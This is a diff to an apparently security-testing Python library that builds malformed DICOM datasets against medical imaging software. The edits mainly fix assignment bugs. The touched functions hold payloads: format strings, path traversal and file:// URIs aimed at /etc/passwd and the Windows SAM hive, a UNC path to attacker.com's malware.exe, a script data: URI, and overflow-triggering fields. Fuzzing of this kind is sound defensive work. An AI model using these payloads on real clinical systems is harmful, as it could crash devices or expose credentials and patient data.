@@ -61,7 +61,6 @@ try:
         DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
         P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
         C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
-        C_ECHO_RQ_Fuzz, C_STORE_RQ_Fuzz,
         PresentationDataValueItem, DICOMSocket,
         DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
         DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
@@ -240,8 +239,8 @@ class ParserAttacks:
     def tag_out_of_order() -> AttackResult:
         """Tags not in ascending order."""
         ds = Dataset()
-        ds.elements.append(Element(0x0020, 0x000D, 'UI', '1.2.3'))  # Study UID
-        ds.elements.append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))  # Patient Name
+        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3'))  # Study UID
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))  # Patient Name
         
         return AttackResult(
             name='tag_out_of_order',
@@ -255,8 +254,8 @@ class ParserAttacks:
     def duplicate_tag() -> AttackResult:
         """Same tag appears twice. CVE-2024-24793 variant."""
         ds = Dataset()
-        ds.elements.append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))
-        ds.elements.append(Element(0x0010, 0x0010, 'PN', 'Evil^Patient'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Doe^John'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Evil^Patient'))
         
         return AttackResult(
             name='duplicate_tag',
@@ -284,8 +283,8 @@ class ParserAttacks:
     def format_string_injection() -> AttackResult:
         """Format string patterns in string VR. CVE-2024-28877 variant."""
         ds = Dataset()
-        ds / Element(0x0008, 0x1030, 'LO', '%s%s%s%s%s%s%s%s%n')  # Study Description
-        ds / Element(0x0010, 0x0010, 'PN', '%x%x%x%x%x%x%x%x')  # Patient Name
+        ds = ds / Element(0x0008, 0x1030, 'LO', '%s%s%s%s%s%s%s%s%n')  # Study Description
+        ds = ds / Element(0x0010, 0x0010, 'PN', '%x%x%x%x%x%x%x%x')  # Patient Name
         
         return AttackResult(
             name='format_string_injection',
@@ -300,8 +299,8 @@ class ParserAttacks:
     def path_traversal_in_string() -> AttackResult:
         """Path traversal patterns in string VR."""
         ds = Dataset()
-        ds / Element(0x0008, 0x1010, 'SH', '../../../etc/passwd')  # Station Name
-        ds / Element(0x0010, 0x0010, 'PN', '..\\..\\..\\Windows\\System32')
+        ds = ds / Element(0x0008, 0x1010, 'SH', '../../../etc/passwd')  # Station Name
+        ds = ds / Element(0x0010, 0x0010, 'PN', '..\\..\\..\\Windows\\System32')
         
         return AttackResult(
             name='path_traversal_in_string',
@@ -563,10 +562,10 @@ class MemoryAttacks:
     def pixel_dimension_overflow() -> AttackResult:
         """Rows/Columns set to cause integer overflow."""
         ds = Dataset()
-        ds / Element(0x0028, 0x0010, 'US', struct.pack('<H', 0xFFFF))  # Rows
-        ds / Element(0x0028, 0x0011, 'US', struct.pack('<H', 0xFFFF))  # Columns
-        ds / Element(0x0028, 0x0100, 'US', struct.pack('<H', 32))      # Bits Alloc
-        ds / Element(0x7FE0, 0x0010, 'OW', b'\x00' * 100)              # Small pixel data
+        ds = ds / Element(0x0028, 0x0010, 'US', struct.pack('<H', 0xFFFF))  # Rows
+        ds = ds / Element(0x0028, 0x0011, 'US', struct.pack('<H', 0xFFFF))  # Columns
+        ds = ds / Element(0x0028, 0x0100, 'US', struct.pack('<H', 32))      # Bits Alloc
+        ds = ds / Element(0x7FE0, 0x0010, 'OW', b'\x00' * 100)              # Small pixel data
         
         return AttackResult(
             name='pixel_dimension_overflow',
@@ -637,7 +636,7 @@ class MemoryAttacks:
     def oversized_string_vr(size: int = 0x10000) -> AttackResult:
         """String VR exceeding normal limits. CVE-2024-22100."""
         ds = Dataset()
-        ds / Element(0x0010, 0x0010, 'PN', 'A' * size)  # Patient Name
+        ds = ds / Element(0x0010, 0x0010, 'PN', 'A' * size)  # Patient Name
         
         return AttackResult(
             name='oversized_string_vr',
@@ -708,9 +707,9 @@ class MemoryAttacks:
         """Lookup Table data exceeding bounds."""
         ds = Dataset()
         # LUT Descriptor: entries, first value, bits stored
-        ds / Element(0x0028, 0x1101, 'US', struct.pack('<HHH', 256, 0, 16))
+        ds = ds / Element(0x0028, 0x1101, 'US', struct.pack('<HHH', 256, 0, 16))
         # LUT Data - way more than 256 entries
-        ds / Element(0x0028, 0x1201, 'OW', b'\x00\x01' * 10000)
+        ds = ds / Element(0x0028, 0x1201, 'OW', b'\x00\x01' * 10000)
         
         return AttackResult(
             name='lut_overflow',
@@ -780,8 +779,8 @@ class LogicAttacks:
     def sop_class_mismatch() -> AttackResult:
         """SOP Class UID doesn't match actual content."""
         ds = Dataset()
-        ds / Element(0x0008, 0x0016, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
-        ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
+        ds = ds / Element(0x0008, 0x0016, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
         # No actual CT-required elements
         
         return AttackResult(
@@ -796,8 +795,8 @@ class LogicAttacks:
     def private_creator_missing() -> AttackResult:
         """Private tag without corresponding private creator."""
         ds = Dataset()
-        ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
-        ds / Element.raw(tag=0x00091001, vr='LO', value=b'PrivateData')
+        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')
+        ds = ds / Element.raw(tag=0x00091001, vr='LO', value=b'PrivateData')
         
         return AttackResult(
             name='private_creator_missing',
@@ -816,7 +815,7 @@ class LogicAttacks:
         viewers may follow without authorization checks.
         """
         ds = Dataset()
-        ds / Element(0x0008, 0x1190, 'UR', url)  # Retrieve URI
+        ds = ds / Element(0x0008, 0x1190, 'UR', url)  # Retrieve URI
         
         return AttackResult(
             name='uri_ssrf',
@@ -831,8 +830,8 @@ class LogicAttacks:
     def file_uri_injection() -> AttackResult:
         """file:// protocol injection. CVE-2024-33606."""
         ds = Dataset()
-        ds / Element(0x0008, 0x1190, 'UR', 'file:///etc/passwd')
-        ds / Element(0x0040, 0xE010, 'UR', 'file:///C:/Windows/System32/config/SAM')
+        ds = ds / Element(0x0008, 0x1190, 'UR', 'file:///etc/passwd')
+        ds = ds / Element(0x0040, 0xE010, 'UR', 'file:///C:/Windows/System32/config/SAM')
         
         return AttackResult(
             name='file_uri_injection',
@@ -847,7 +846,7 @@ class LogicAttacks:
     def unc_path_injection() -> AttackResult:
         """UNC path injection. CVE-2024-33606."""
         ds = Dataset()
-        ds / Element(0x0008, 0x1190, 'UR', '\\\\attacker.com\\share\\malware.exe')
+        ds = ds / Element(0x0008, 0x1190, 'UR', '\\\\attacker.com\\share\\malware.exe')
         
         return AttackResult(
             name='unc_path_injection',
@@ -862,7 +861,7 @@ class LogicAttacks:
     def data_uri_script() -> AttackResult:
         """data: URI with script. CVE-2024-33606."""
         ds = Dataset()
-        ds / Element(0x0008, 0x1190, 'UR', 'data:text/html,<script>alert(1)</script>')
+        ds = ds / Element(0x0008, 0x1190, 'UR', 'data:text/html,<script>alert(1)</script>')
         
         return AttackResult(
             name='data_uri_script',
@@ -1581,7 +1580,7 @@ class ProtocolFuzzer:
                 # Fuzz different aspects
                 if i % 5 == 0:
                     # Fuzz group_length
-                    cmd = C_STORE_RQ_Fuzz(
+                    cmd = C_STORE_RQ(
                         command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
                         affected_sop_class_uid=_uid_to_bytes(sop_class),
                         affected_sop_instance_uid=f'1.2.3.{i}'.encode(),
@@ -1590,7 +1589,7 @@ class ProtocolFuzzer:
                     mutation = 'group_length'
                 elif i % 5 == 1:
                     # Odd-length UIDs
-                    cmd = C_STORE_RQ_Fuzz(
+                    cmd = C_STORE_RQ(
                         command_group_length=100,
                         affected_sop_class_uid=b'1.2.3.4.5',  # 9 bytes - odd
                         affected_sop_instance_uid=b'1.2.3.4.5.6.7',  # 13 bytes - odd
